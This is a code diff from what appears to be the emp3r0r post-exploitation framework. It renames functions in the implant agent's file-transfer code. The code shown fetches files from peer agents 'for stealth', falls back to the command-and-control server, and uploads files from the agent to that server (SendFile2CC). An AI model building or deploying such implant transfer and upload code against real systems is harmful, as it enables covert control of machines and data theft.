@@ -5,12 +5,13 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"net/http"
 	"net/url"
 	"os"
 	"sync"
 	"time"
+
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 
 	"github.com/cavaliergopher/grab/v3"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
@@ -22,14 +23,14 @@ import (
 	"github.com/mholt/archives"
 )
 
-// SmartDownload download via grab, if path is empty, return []byte instead
+// FetchFile download via grab, if path is empty, return []byte instead
 // This will try to download from other agents for better speed and stealth
 // when fail, will try to download from CC
-func SmartDownload(download_addr, file_to_download, path, checksum string) (data []byte, err error) {
+func FetchFile(download_addr, file_to_download, path, checksum string) (data []byte, err error) {
 	if util.IsFileExist(path) {
 		// check checksum
 		if crypto.SHA256SumFile(path) == checksum {
-			logging.Printf("SmartDownload: %s already exists and checksum matches", path)
+			logging.Printf("FetchFile: %s already exists and checksum matches", path)
 			return
 		}
 	}
@@ -37,12 +38,12 @@ func SmartDownload(download_addr, file_to_download, path, checksum string) (data
 	// if download_host is given, download from the specified agent
 	if download_addr != "" {
 		// download from other agent
-		logging.Printf("SmartDownload: downloading from %s", download_addr)
-		err = DownloadFromPeerKCP(download_addr, file_to_download, path, checksum)
+		logging.Printf("FetchFile: downloading from %s", download_addr)
+		err = FetchFileKCP(download_addr, file_to_download, path, checksum)
 		if util.IsFileExist(path) {
 			// checksum
 			if crypto.SHA256SumFile(path) == checksum {
-				logging.Printf("SmartDownload: %s downloaded via TCP and checksum matches", path)
+				logging.Printf("FetchFile: %s downloaded via TCP and checksum matches", path)
 			}
 		}
 		return nil, err
@@ -185,7 +186,7 @@ func SendFile2CC(filepath string, offset int64, token string) (err error) {
 		def.CCAddress,
 		transport.Upload2AgentAPI,
 		token)
-	conn, _, _, err := ConnectCC(url)
+	conn, _, _, err := EstablishC2Connection(url)
 	logging.Printf("connection: %s", url)
 	if err != nil {
 		err = fmt.Errorf("connection failed: %v", err)
@@ -270,8 +271,8 @@ func handleClient(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, file_path)
 }
 
-// DownloadFromPeerKCP requests and downloads a file from an HTTP server to a specified path
-func DownloadFromPeerKCP(address, filepath, path, checksum string) (err error) {
+// FetchFileKCP requests and downloads a file from an HTTP server to a specified path
+func FetchFileKCP(address, filepath, path, checksum string) (err error) {
 	ctx, cancel := context.WithCancel(context.Background())
 	defer cancel()
 
